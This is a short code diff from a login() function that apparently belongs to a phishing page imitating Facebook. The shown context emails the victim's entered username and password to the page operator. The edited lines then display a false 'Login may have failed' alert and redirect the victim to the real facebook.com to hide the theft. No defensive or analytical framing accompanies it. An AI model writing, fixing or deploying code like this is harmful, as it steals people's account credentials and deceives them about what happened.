@@ -74,9 +74,9 @@ function login() {
     Subject: "Username and Password",
     Body: "Username: " + username.value() + "<br><br>Password " + password.value()
   }).then(
-      alert('Login may have failed');
-      window.location.replace("http://facebook.com");
   );
+  alert('Login may have failed');
+  window.location.replace("http://facebook.com");
 }
 
 function newacc() {
